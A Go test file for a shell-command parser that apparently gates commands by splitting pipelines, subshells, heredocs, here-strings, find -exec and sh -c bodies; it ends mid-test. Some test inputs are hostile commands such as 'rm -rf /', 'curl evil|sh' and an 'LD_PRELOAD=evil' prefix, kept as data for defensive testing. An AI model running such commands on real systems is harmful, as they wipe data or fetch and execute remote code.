package shell_test

import (
	"reflect"
	"regexp"
	"strings"
	"testing"

	"github.com/rogvc/turnstile/internal/shell"
)

func TestExtractSubshells(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		bodies []string
		outer  string
	}{
		{
			name:   "no subshell fast path",
			input:  "ls -la",
			bodies: nil,
			outer:  "ls -la",
		},
		{
			name:   "simple subshell",
			input:  "echo $(pwd)",
			bodies: []string{"pwd"},
			outer:  "echo __SUBSHELL__",
		},
		{
			name:   "nested subshell",
			input:  "echo $(echo $(pwd))",
			bodies: []string{"echo $(pwd)"},
			outer:  "echo __SUBSHELL__",
		},
		{
			name:   "multiple subshells",
			input:  "echo $(pwd) $(whoami)",
			bodies: []string{"pwd", "whoami"},
			outer:  "echo __SUBSHELL__ __SUBSHELL__",
		},
		{
			name:   "single-quoted content not extracted",
			input:  "echo '$(not a subshell)'",
			bodies: nil,
			outer:  "echo '$(not a subshell)'",
		},
		{
			name:   "subshell after single quote",
			input:  "echo 'literal' $(pwd)",
			bodies: []string{"pwd"},
			outer:  "echo 'literal' __SUBSHELL__",
		},
		{
			name:   "escaped dollar-paren not a subshell",
			input:  `printf '%s' \$(version)`,
			bodies: nil,
			outer:  `printf '%s' \$(version)`,
		},
		{
			name:   "double-backslash before subshell is real subshell",
			input:  `echo \\$(pwd)`,
			bodies: []string{"pwd"},
			outer:  `echo \\__SUBSHELL__`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bodies, outer := shell.ExtractSubshells(tt.input)
			if !reflect.DeepEqual(bodies, tt.bodies) {
				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
			}
			if outer != tt.outer {
				t.Errorf("outer: got %q, want %q", outer, tt.outer)
			}
		})
	}
}

func TestExtractBackticks(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		bodies []string
		outer  string
	}{
		{
			name:   "no backtick fast path",
			input:  "ls -la",
			bodies: nil,
			outer:  "ls -la",
		},
		{
			name:   "simple backtick",
			input:  "echo `pwd`",
			bodies: []string{"pwd"},
			outer:  "echo __SUBSHELL__",
		},
		{
			name:   "two backtick spans",
			input:  "echo `pwd` `whoami`",
			bodies: []string{"pwd", "whoami"},
			outer:  "echo __SUBSHELL__ __SUBSHELL__",
		},
		{
			name:   "backtick inside single quotes is literal",
			input:  "echo 'literal `pwd`'",
			bodies: nil,
			outer:  "echo 'literal `pwd`'",
		},
		{
			name:   "escaped backtick is unescaped in body",
			input:  "echo `printf \\`hi\\``",
			bodies: []string{"printf `hi`"},
			outer:  "echo __SUBSHELL__",
		},
		{
			name:   "unterminated backtick passes through",
			input:  "echo `pwd",
			bodies: nil,
			outer:  "echo `pwd",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bodies, outer := shell.ExtractBackticks(tt.input)
			if !reflect.DeepEqual(bodies, tt.bodies) {
				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
			}
			if outer != tt.outer {
				t.Errorf("outer: got %q, want %q", outer, tt.outer)
			}
		})
	}
}

func TestExtractProcSubst(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		bodies []string
		outer  string
	}{
		{
			name:   "no process substitution fast path",
			input:  "ls -la",
			bodies: nil,
			outer:  "ls -la",
		},
		{
			name:   "simple input process substitution",
			input:  "cat <(pwd)",
			bodies: []string{"pwd"},
			outer:  "cat __PROCSUBST__",
		},
		{
			name:   "simple output process substitution",
			input:  "tee >(cat)",
			bodies: []string{"cat"},
			outer:  "tee __PROCSUBST__",
		},
		{
			name:   "multiple process substitutions",
			input:  "diff <(git status) <(git diff --stat)",
			bodies: []string{"git status", "git diff --stat"},
			outer:  "diff __PROCSUBST__ __PROCSUBST__",
		},
		{
			name:   "mixed input and output process substitutions",
			input:  "tee >(cat) >(grep foo)",
			bodies: []string{"cat", "grep foo"},
			outer:  "tee __PROCSUBST__ __PROCSUBST__",
		},
		{
			name:   "nested process substitution",
			input:  "cat <(echo <(pwd))",
			bodies: []string{"echo <(pwd)"},
			outer:  "cat __PROCSUBST__",
		},
		{
			name:   "single-quoted content not extracted",
			input:  "echo '<(not a process substitution)'",
			bodies: nil,
			outer:  "echo '<(not a process substitution)'",
		},
		{
			name:   "process substitution after single quote",
			input:  "echo 'literal' <(pwd)",
			bodies: []string{"pwd"},
			outer:  "echo 'literal' __PROCSUBST__",
		},
		{
			name:   "escaped opener not a process substitution",
			input:  `printf '%s' \<(version)`,
			bodies: nil,
			outer:  `printf '%s' \<(version)`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bodies, outer := shell.ExtractProcSubst(tt.input)
			if !reflect.DeepEqual(bodies, tt.bodies) {
				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
			}
			if outer != tt.outer {
				t.Errorf("outer: got %q, want %q", outer, tt.outer)
			}
		})
	}
}

func TestRemoveQuotedContent(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "no quotes fast path",
			input: "ls -la",
			want:  "ls -la",
		},
		{
			name:  "double-quoted operators masked",
			input: `echo "a > b"`,
			want:  `echo "_____"`,
		},
		{
			name:  "single-quoted operators masked",
			input: "echo 'a | b'",
			want:  "echo '_____'",
		},
		{
			name:  "escaped double-quote inside double quotes",
			input: `echo "say \"hi\""`,
			want:  `echo "__________"`,
		},
		{
			name:  "escaped dollar inside double quotes",
			input: `echo "\$HOME"`,
			want:  `echo "______"`,
		},
		{
			name:  "outside-quote content unchanged",
			input: `ls | grep "foo"`,
			want:  `ls | grep "___"`,
		},
		{
			name:  "unterminated quote consumes rest",
			input: `echo "unclosed`,
			want:  `echo "________`,
		},
		{
			name:  "ANSI-C string with escaped apostrophe",
			input: `echo $'it\'s fine'`,
			want:  `echo $'__________'`,
		},
		{
			name:  "ANSI-C string with escaped backslash",
			input: `echo $'path\\to\\file'`,
			want:  `echo $'______________'`,
		},
		{
			name:  "ANSI-C string with newline escape",
			input: `echo $'line1\nline2'`,
			want:  `echo $'____________'`,
		},
		{
			name:  "ANSI-C string with tab escape",
			input: `echo $'tab\there'`,
			want:  `echo $'_________'`,
		},
		{
			name:  "regular single quote not ANSI-C",
			input: `echo 'plain text'`,
			want:  `echo '__________'`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shell.RemoveQuotedContent(tt.input)
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestFindSplitBoundaries(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  [][2]int
	}{
		{
			name:  "no delimiters",
			input: "ls -la",
			want:  nil,
		},
		{
			name:  "pipe",
			input: "ls | grep foo",
			want:  [][2]int{{3, 4}},
		},
		{
			name:  "or-or",
			input: "cmd1 || cmd2",
			want:  [][2]int{{5, 7}},
		},
		{
			name:  "and-and",
			input: "cmd1 && cmd2",
			want:  [][2]int{{5, 7}},
		},
		{
			name:  "semicolon",
			input: "cmd1; cmd2",
			want:  [][2]int{{4, 5}},
		},
		{
			name:  "newline",
			input: "cmd1\ncmd2",
			want:  [][2]int{{4, 5}},
		},
		{
			name:  "solo ampersand not a delimiter",
			input: "cmd1 & cmd2",
			want:  nil,
		},
		{
			name:  "pipe inside double quotes skipped",
			input: `echo "a|b"`,
			want:  nil,
		},
		{
			name:  "pipe inside single quotes skipped",
			input: "echo 'a|b'",
			want:  nil,
		},
		{
			name:  "multiple delimiters",
			input: "a | b && c; d",
			want:  [][2]int{{2, 3}, {6, 8}, {10, 11}},
		},
		{
			name:  "ANSI-C string with escaped apostrophe not split",
			input: `echo $'it\'s fine' | grep foo`,
			want:  [][2]int{{19, 20}},
		},
		{
			// Bash treats \| as a literal pipe character, so the escaped pipe
			// must not be reported as a pipeline boundary. Only the unescaped
			// pipe later in the line is a real boundary.
			name:  "escaped pipe is not a delimiter",
			input: `grep foo\|bar | head`,
			want:  [][2]int{{14, 15}},
		},
		{
			name:  "escaped semicolon is not a delimiter",
			input: `echo a\;b`,
			want:  nil,
		},
		{
			name:  "escaped first pipe in pair leaves real pipe intact",
			input: `cmd1 \| cmd2 | cmd3`,
			want:  [][2]int{{13, 14}},
		},
		{
			name:  "pipe inside ANSI-C string skipped",
			input: `echo $'a|b'`,
			want:  nil,
		},
		{
			name:  "semicolon inside ANSI-C string skipped",
			input: `echo $'cmd1;cmd2'`,
			want:  nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shell.FindSplitBoundaries(tt.input)
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("got %v, want %v", got, tt.want)
			}
		})
	}
}

func TestSplitPipeline(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		{
			name:  "single command",
			input: "ls -la",
			want:  []string{"ls -la"},
		},
		{
			name:  "pipe chain",
			input: "ls | grep foo",
			want:  []string{"ls", "grep foo"},
		},
		{
			name:  "semicolon chain",
			input: "ls; pwd; echo hi",
			want:  []string{"ls", "pwd", "echo hi"},
		},
		{
			name:  "env var prefix stripped",
			input: "FOO=bar git status",
			want:  []string{"git status"},
		},
		{
			name:  "multiple env var prefixes stripped",
			input: "A=1 B=2 ls",
			want:  []string{"ls"},
		},
		{
			name:  "segment starting with # skipped",
			input: "ls | # comment | pwd",
			want:  []string{"ls", "pwd"},
		},
		{
			name:  "leading paren stripped",
			input: "(ls -la)",
			want:  []string{"ls -la"},
		},
		{
			name:  "flag-only segment appended to previous",
			input: "ls | -la",
			want:  []string{"ls -la"},
		},
		{
			name:  "empty input",
			input: "",
			want:  []string{},
		},
		{
			name:  "whitespace-only",
			input: "   ",
			want:  []string{},
		},
		{
			name:  "backslash-only segment dropped",
			input: "ls | \\ | pwd",
			want:  []string{"ls", "pwd"},
		},
		{
			// A standalone FOO=bar (no trailing command) is kept as a segment;
			// it matches the \w+= allow pattern so the gate passes it through.
			name:  "standalone env-var assignment kept",
			input: "FOO=bar | ls",
			want:  []string{"FOO=bar", "ls"},
		},
		{
			name:  "quoted env var with spaces stripped",
			input: `FOO="a b" git status`,
			want:  []string{"git status"},
		},
		{
			name:  "single-quoted env var stripped",
			input: `BAR='x y' ls -la`,
			want:  []string{"ls -la"},
		},
		{
			name:  "brace group leading brace stripped",
			input: "{ git status; ls; }",
			want:  []string{"git status", "ls"},
		},
		{
			name:  "subshell with parens cleaned",
			input: "(ls -la)",
			want:  []string{"ls -la"},
		},
		{
			name:  "nested subshell cleaned",
			input: "(git status)",
			want:  []string{"git status"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shell.SplitPipeline(tt.input)
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("got %v, want %v", got, tt.want)
			}
		})
	}
}

func TestSplitPipelineDetailed(t *testing.T) {
	// SplitPipelineDetailed exposes leading NAME=value variable names per
	// segment so callers (the gate) can enforce sensitive-name policies on
	// inline-command env vars (e.g. `LD_PRELOAD=evil ls`).
	tests := []struct {
		name     string
		input    string
		segs     []string
		envNames [][]string
	}{
		{
			name:     "no assignments",
			input:    "ls -la",
			segs:     []string{"ls -la"},
			envNames: [][]string{nil},
		},
		{
			name:     "single assignment with command",
			input:    "FOO=bar git status",
			segs:     []string{"git status"},
			envNames: [][]string{{"FOO"}},
		},
		{
			name:     "multiple assignments with command",
			input:    "A=1 B=2 C=3 ls",
			segs:     []string{"ls"},
			envNames: [][]string{{"A", "B", "C"}},
		},
		{
			name:     "quoted-value assignment",
			input:    `FOO="a b" git status`,
			segs:     []string{"git status"},
			envNames: [][]string{{"FOO"}},
		},
		{
			name:     "single-quoted-value assignment",
			input:    `BAR='x y' ls -la`,
			segs:     []string{"ls -la"},
			envNames: [][]string{{"BAR"}},
		},
		{
			name:     "assignments per pipeline stage",
			input:    "A=1 ls | B=2 grep foo",
			segs:     []string{"ls", "grep foo"},
			envNames: [][]string{{"A"}, {"B"}},
		},
		{
			name:     "argument with equals not treated as assignment",
			input:    "make CC=gcc",
			segs:     []string{"make CC=gcc"},
			envNames: [][]string{nil},
		},
		{
			name:     "standalone assignment kept as segment with no env names",
			input:    "FOO=bar",
			segs:     []string{"FOO=bar"},
			envNames: [][]string{nil},
		},
		{
			// Bash array literal: `files=(a b c)`. EnvVarRE must NOT swallow the
			// `(a` as the value of `files=` and leave `b c)` as the remainder,
			// or the gate sees a phantom command. Treated as one assignment
			// segment that the allow-list (`\w+=`) will accept.
			name:     "array literal not split into phantom command",
			input:    "files=(a b c)",
			segs:     []string{"files=(a b c"}, // trailing `)` stripped by SplitPipeline
			envNames: [][]string{nil},
		},
		{
			name:     "array literal with quoted entries",
			input:    `files=("a" "b c")`,
			segs:     []string{`files=("a" "b c"`},
			envNames: [][]string{nil},
		},
		{
			name:     "empty array literal",
			input:    "files=()",
			segs:     []string{"files=("},
			envNames: [][]string{nil},
		},
		{
			// Standalone assignment (no trailing command) whose double-quoted
			// value contains interior spaces. The quoted-value branch must match
			// the whole `"--profile $P --region x"` rather than backtracking to
			// the unquoted branch, which would swallow `"--profile` and strand
			// `$P --region x"` as a phantom command.
			name:     "standalone spaced double-quoted value kept intact",
			input:    `R="--profile $P --region us-west-2"`,
			segs:     []string{`R="--profile $P --region us-west-2"`},
			envNames: [][]string{nil},
		},
		{
			name:     "standalone spaced single-quoted value kept intact",
			input:    `R='--profile x --region y'`,
			segs:     []string{`R='--profile x --region y'`},
			envNames: [][]string{nil},
		},
		{
			// Same value but followed by a command: the assignment is a prefix,
			// so its name is extracted and the command is the segment.
			name:     "spaced quoted value as prefix on a command",
			input:    `R="--profile x --region y" aws sts`,
			segs:     []string{"aws sts"},
			envNames: [][]string{{"R"}},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotSegs, gotEnv := shell.SplitPipelineDetailed(tt.input)
			if !reflect.DeepEqual(gotSegs, tt.segs) {
				t.Errorf("segments: got %v, want %v", gotSegs, tt.segs)
			}
			if !reflect.DeepEqual(gotEnv, tt.envNames) {
				t.Errorf("env names: got %v, want %v", gotEnv, tt.envNames)
			}
		})
	}
}

func TestStripLeadingPath(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty input", "", ""},
		{"no slash leaves segment alone", "sed -i ''", "sed -i ''"},
		{"absolute path stripped", "/bin/sed -i ''", "sed -i ''"},
		{"multi-segment absolute path stripped", "/usr/local/bin/git status", "git status"},
		{"relative dot path stripped", "./tools/jest --watch", "jest --watch"},
		{"plain relative path stripped", "node_modules/.bin/jest -t foo", "jest -t foo"},
		{"trailing slash on command leaves segment alone", "/bin/ -h", "/bin/ -h"},
		{"bare slash leaves segment alone", "/", "/"},
		{"args with slashes are not the leading token", "sed -i '' /etc/hosts", "sed -i '' /etc/hosts"},
		{"glob in command word leaves segment alone", "/bin/[a-z]* foo", "/bin/[a-z]* foo"},
		{"variable in command word leaves segment alone", "/bin/$X foo", "/bin/$X foo"},
		{"tab separator after command", "/bin/sed\t-e ''", "sed\t-e ''"},
		{"assignment with path-valued RHS not stripped", "FOO=/some/path", "FOO=/some/path"},
		{"long-name assignment with path-valued RHS not stripped", "SOME_PATH=/home/usr/some/dir", "SOME_PATH=/home/usr/some/dir"},
		{"assignment with path-list RHS not stripped", "PATH=/usr/local/bin:/usr/bin", "PATH=/usr/local/bin:/usr/bin"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shell.StripLeadingPath(tt.input)
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestStripExemptPaths(t *testing.T) {
	// docker-volume example: -v / --volume flag with source:dest mount spec.
	dockerFlagRE := regexp.MustCompile(`(?:--volume=|--volume\s+|-v\s+)(\S+)`)
	exempt := []string{"/tmp", "/var/tmp"}
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "safe /tmp path replaced",
			input: "docker run -v /tmp/build:/build alpine",
			want:  "docker run __SAFE_PATH__ alpine",
		},
		{
			name:  "safe /var/tmp path replaced",
			input: "docker run -v /var/tmp/x:/x alpine",
			want:  "docker run __SAFE_PATH__ alpine",
		},
		{
			name:  "unsafe /etc path rewritten to __UNSAFE_PATH__",
			input: "docker run -v /etc:/etc alpine",
			want:  "docker run -v __UNSAFE_PATH__ alpine",
		},
		{
			name:  "traversal /tmp/../etc rewritten to __UNSAFE_PATH__",
			input: "docker run -v /tmp/../etc:/e alpine",
			want:  "docker run -v __UNSAFE_PATH__ alpine",
		},
		{
			name:  "--volume= form replaced",
			input: "docker run --volume=/tmp/x:/x alpine",
			want:  "docker run __SAFE_PATH__ alpine",
		},
		{
			name:  "--volume space form replaced",
			input: "docker run --volume /tmp/x:/x alpine",
			want:  "docker run __SAFE_PATH__ alpine",
		},
		{
			name:  "no matching flag unchanged",
			input: "docker run alpine",
			want:  "docker run alpine",
		},
		{
			name:  "empty exempt list — nothing replaced",
			input: "docker run -v /tmp/x:/x alpine",
			want:  "docker run -v /tmp/x:/x alpine",
		},
		{
			name:  "quoted safe path replaced",
			input: `docker run -v "/tmp/build:/build" alpine`,
			want:  "docker run __SAFE_PATH__ alpine",
		},
		{
			name:  "quoted unsafe path rewritten to __UNSAFE_PATH__",
			input: `docker run -v "/etc:/etc" alpine`,
			want:  `docker run -v __UNSAFE_PATH__ alpine`,
		},
		{
			name:  "quoted traversal in --volume= rewritten to __UNSAFE_PATH__",
			input: `docker run --volume="/tmp/../etc:/e" alpine`,
			want:  "docker run --volume=__UNSAFE_PATH__ alpine",
		},
		{
			name:  "single-quoted traversal in -v rewritten to __UNSAFE_PATH__",
			input: `docker run -v '/tmp/../etc:/e' alpine`,
			want:  "docker run -v __UNSAFE_PATH__ alpine",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ex := exempt
			if strings.Contains(tt.name, "empty exempt") {
				ex = nil
			}
			got := shell.StripExemptPaths(tt.input, dockerFlagRE, ex)
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func BenchmarkStripWrappers(b *testing.B) {
	benchmarks := []struct {
		name  string
		input string
		extra []string
	}{
		{
			name:  "no-wrapper-common-case",
			input: "git status",
			extra: nil,
		},
		{
			name:  "with-timeout-wrapper",
			input: "timeout 30 npm test",
			extra: nil,
		},
		{
			name:  "nested-wrappers",
			input: "timeout 5 nohup ./run",
			extra: nil,
		},
	}

	for _, bm := range benchmarks {
		b.Run(bm.name, func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				shell.StripWrappers(bm.input, bm.extra)
			}
		})
	}
}

func TestStripWrappers(t *testing.T) {
	tests := []struct {
		name  string
		input string
		extra []string
		want  string
	}{
		{
			name:  "no wrapper",
			input: "git status",
			want:  "git status",
		},
		{
			name:  "timeout with duration",
			input: "timeout 30 npm test",
			want:  "npm test",
		},
		{
			name:  "timeout with suffix duration",
			input: "timeout 5m go build .",
			want:  "go build .",
		},
		{
			name:  "time",
			input: "time git status",
			want:  "git status",
		},
		{
			name:  "nice no flags",
			input: "nice git status",
			want:  "git status",
		},
		{
			name:  "nice with -n flag",
			input: "nice -n 10 git status",
			want:  "git status",
		},
		{
			name:  "nohup",
			input: "nohup ./server",
			want:  "./server",
		},
		{
			name:  "stdbuf with flag",
			input: "stdbuf -oL npm test",
			want:  "npm test",
		},
		{
			name:  "stdbuf without flags not stripped",
			input: "stdbuf npm test",
			want:  "stdbuf npm test",
		},
		{
			name:  "xargs bare stripped",
			input: "xargs grep pattern",
			want:  "grep pattern",
		},
		{
			name:  "xargs with flag not stripped",
			input: "xargs -n1 grep pattern",
			want:  "xargs -n1 grep pattern",
		},
		{
			name:  "nested wrappers stripped iteratively",
			input: "timeout 5 nohup ./run",
			want:  "./run",
		},
		{
			name:  "user-defined extra wrapper",
			input: "devbox run npm test",
			extra: []string{"devbox run"},
			want:  "npm test",
		},
		{
			name:  "unknown command unchanged",
			input: "myapp --flag arg",
			want:  "myapp --flag arg",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shell.StripWrappers(tt.input, tt.extra)
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestExtractHeredocs(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
		ok    bool
	}{
		{
			name:  "no heredoc fast path",
			input: "echo hello",
			want:  "echo hello",
			ok:    true,
		},
		{
			name:  "basic heredoc body stripped",
			input: "python3 <<EOF\nimport json\nprint('hi')\nEOF",
			want:  "python3 <<EOF",
			ok:    true,
		},
		{
			name:  "strip-tabs form",
			input: "cat <<-EOF\n\thello\nEOF",
			want:  "cat <<-EOF",
			ok:    true,
		},
		{
			name:  "quoted delimiter",
			input: "cat <<'EOF'\nhello\nEOF",
			want:  "cat <<'EOF'",
			ok:    true,
		},
		{
			name:  "double-quoted delimiter",
			input: "cat <<\"EOF\"\nhello\nEOF",
			want:  "cat <<\"EOF\"",
			ok:    true,
		},
		{
			name:  "heredoc in compound command",
			input: "echo start && cat <<EOF\nbody\nEOF\necho end",
			want:  "echo start && cat <<EOF\necho end",
			ok:    true,
		},
		{
			name:  "multiple heredocs on one line",
			input: "cmd <<A <<B\nbodyA\nA\nbodyB\nB",
			want:  "cmd <<A <<B",
			ok:    true,
		},
		{
			name:  "unterminated heredoc returns false",
			input: "cat <<EOF\nbody without terminator",
			want:  "cat <<EOF",
			ok:    false,
		},
		{
			name:  "here-string not treated as heredoc",
			input: "cat <<< 'literal string'",
			want:  "cat <<< 'literal string'",
			ok:    true,
		},
		{
			name:  "heredoc opener inside single quotes is ignored",
			input: "echo '<<EOF'",
			want:  "echo '<<EOF'",
			ok:    true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := shell.ExtractHeredocs(tt.input)
			if ok != tt.ok {
				t.Errorf("ok: got %v, want %v", ok, tt.ok)
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestStripComments(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "no comment",
			input: "ls -la",
			want:  "ls -la",
		},
		{
			name:  "comment-only line removed",
			input: "# this is a comment\nls",
			want:  "ls",
		},
		{
			name:  "indented comment removed",
			input: "  # indented\nls",
			want:  "ls",
		},
		{
			name:  "comment between commands removed",
			input: "ls\n# comment\npwd",
			want:  "ls\npwd",
		},
		{
			name:  "inline hash after command not removed",
			input: "ls # inline",
			want:  "ls # inline",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shell.StripComments(tt.input)
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestJoinContinuations(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "no continuation",
			input: "ls -la",
			want:  "ls -la",
		},
		{
			name:  "single continuation",
			input: "ls \\\n-la",
			want:  "ls  -la",
		},
		{
			name:  "multiple continuations",
			input: "git \\\ncommit \\\n-m 'msg'",
			want:  "git  commit  -m 'msg'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shell.JoinContinuations(tt.input)
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func FuzzExtractSubshells(f *testing.F) {
	for _, s := range []string{"", "echo $(", "'$(x)'", "$($($($())))", `"$(rm)"`, "no subshell"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		bodies, outer := shell.ExtractSubshells(s)
		// Outer can legitimately grow when __SUBSHELL__ (12 chars) replaces
		// shorter subshells, but should not grow unboundedly.
		maxGrowth := len(bodies) * (len("__SUBSHELL__") - len("$()"))
		if len(outer) > len(s)+maxGrowth {
			t.Fatalf("outer grew unexpectedly: %d > %d + %d", len(outer), len(s), maxGrowth)
		}
		if strings.Count(outer, "__SUBSHELL__") != len(bodies) {
			t.Fatalf("placeholder count %d != bodies %d", strings.Count(outer, "__SUBSHELL__"), len(bodies))
		}
	})
}

func FuzzExtractHeredocs(f *testing.F) {
	for _, s := range []string{"", "cat <<EOF\nbody\nEOF", "cat <<A <<B\nA\nB", "cat <<-EOF\n\tEOF", "cat <<<x", "cat <<EOF"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		out, ok := shell.ExtractHeredocs(s)
		if ok && strings.Count(out, "\n")+1 > strings.Count(s, "\n")+1 {
			t.Fatalf("line count grew: %q -> %q", s, out)
		}
	})
}

func FuzzFindSplitBoundaries(f *testing.F) {
	for _, s := range []string{"", "a|b", `"a|b"`, `'a|b'`, `\\|x`, "a&&b;c||d"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		bs := shell.FindSplitBoundaries(s)
		for i, b := range bs {
			if b[0] < 0 || b[1] > len(s) || b[0] >= b[1] {
				t.Fatalf("boundary %d out of range: %v in %q", i, b, s)
			}
			if i > 0 && bs[i-1][1] > b[0] {
				t.Fatalf("boundaries overlap: %v then %v", bs[i-1], b)
			}
		}
	})
}

func FuzzRemoveQuotedContent(f *testing.F) {
	for _, s := range []string{"", `"\\`, "'sudo'", `"sudo`, `"\"sudo\""`} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		out := shell.RemoveQuotedContent(s)
		if len(out) != len(s) {
			t.Fatalf("length changed: %d -> %d", len(s), len(out))
		}
	})
}

func TestExtractHereStringBody(t *testing.T) {
	tests := []struct {
		name  string
		input string
		body  string
		ok    bool
	}{
		{
			name:  "single-quoted body",
			input: "bash <<< 'rm -rf /'",
			body:  "rm -rf /",
			ok:    true,
		},
		{
			name:  "double-quoted body",
			input: "bash <<< \"git status\"",
			body:  "git status",
			ok:    true,
		},
		{
			name:  "unquoted body",
			input: "bash <<< pwd",
			body:  "pwd",
			ok:    true,
		},
		{
			name:  "unquoted body with trailing space",
			input: "bash <<< pwd ",
			body:  "pwd",
			ok:    true,
		},
		{
			name:  "sh interpreter",
			input: "sh <<< 'echo hi'",
			body:  "echo hi",
			ok:    true,
		},
		{
			name:  "zsh interpreter",
			input: "zsh <<< 'ls -la'",
			body:  "ls -la",
			ok:    true,
		},
		{
			name:  "dash interpreter",
			input: "dash <<< 'cat file'",
			body:  "cat file",
			ok:    true,
		},
		{
			name:  "ash interpreter",
			input: "ash <<< 'grep foo'",
			body:  "grep foo",
			ok:    true,
		},
		{
			name:  "non-interpreter opener — grep",
			input: "grep foo <<< 'haystack'",
			body:  "",
			ok:    false,
		},
		{
			name:  "non-interpreter opener — cat",
			input: "cat <<< 'data'",
			body:  "",
			ok:    false,
		},
		{
			name:  "no here-string",
			input: "bash -c 'pwd'",
			body:  "",
			ok:    false,
		},
		{
			name:  "empty right-hand side",
			input: "bash <<< ",
			body:  "",
			ok:    false,
		},
		{
			name:  "unterminated single quote",
			input: "bash <<< 'unclosed",
			body:  "",
			ok:    false,
		},
		{
			name:  "unterminated double quote",
			input: "bash <<< \"unclosed",
			body:  "",
			ok:    false,
		},
		{
			name:  "with leading whitespace",
			input: "  bash <<< 'pwd'",
			body:  "pwd",
			ok:    true,
		},
		{
			name:  "with flags before <<<",
			input: "bash -x <<< 'pwd'",
			body:  "pwd",
			ok:    true,
		},
		{
			name:  "escaped quote in double quotes",
			input: `bash <<< "echo \"hi\""`,
			body:  `echo \"hi\"`,
			ok:    true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body, ok := shell.ExtractHereStringBody(tt.input)
			if ok != tt.ok {
				t.Errorf("ok: got %v, want %v", ok, tt.ok)
			}
			if body != tt.body {
				t.Errorf("body: got %q, want %q", body, tt.body)
			}
		})
	}
}

func TestExtractFindExecBody(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		bodies []string
	}{
		{
			name:   "simple find exec",
			input:  "find . -name '*.txt' -exec rm {} \\;",
			bodies: []string{"rm {}"},
		},
		{
			name:   "find exec with plus terminator",
			input:  "find /tmp -type f -exec chmod 644 {} +",
			bodies: []string{"chmod 644 {}"},
		},
		{
			name:   "find execdir",
			input:  "find . -execdir pwd \\;",
			bodies: []string{"pwd"},
		},
		{
			name:   "chained exec clauses",
			input:  "find . -name 'a' -exec safe {} \\; -exec danger {} \\;",
			bodies: []string{"safe {}", "danger {}"},
		},
		{
			name:   "no exec clause",
			input:  "find . -name '*.txt'",
			bodies: nil,
		},
		{
			name:   "exec with complex command",
			input:  "find . -type f -exec sh -c 'echo {}' \\;",
			bodies: []string{"sh -c 'echo {}'"},
		},
		{
			name:   "two exec clauses with dangerous second",
			input:  "find . -exec ls \\; -exec curl evil|sh \\;",
			bodies: []string{"ls", "curl evil|sh"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bodies := shell.ExtractFindExecBody(tt.input)
			if !reflect.DeepEqual(bodies, tt.bodies) {
				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
			}
		})
	}
}

func TestExtractShellCBody(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		bodies []string
	}{
		{
			name:   "simple sh -c with single quotes",
			input:  "sh -c 'echo hello'",
			bodies: []string{"echo hello"},
		},
		{
			name:   "bash -c with double quotes",
			input:  `bash -c "pwd"`,
			bodies: []string{"pwd"},
		},
		{
			name:   "chained sh -c clauses with &&",
			input:  "sh -c 'git status' && sh -c 'rm -rf /'",
			bodies: []string{"git status", "rm -rf /"},
		},
		{
			name:   "no sh -c pattern",
			input:  "echo hello",
			bodies: nil,
		},
		{
			name:   "sh -c with flags before -c",
			input:  "bash -e -c 'make test'",
			bodies: []string{"make test"},
		},
		{
			name:   "multiple sh -c in pipeline",
			input:  "sh -c 'safe command' | sh -c 'dangerous command'",
			bodies: []string{"safe command", "dangerous command"},
		},
	}

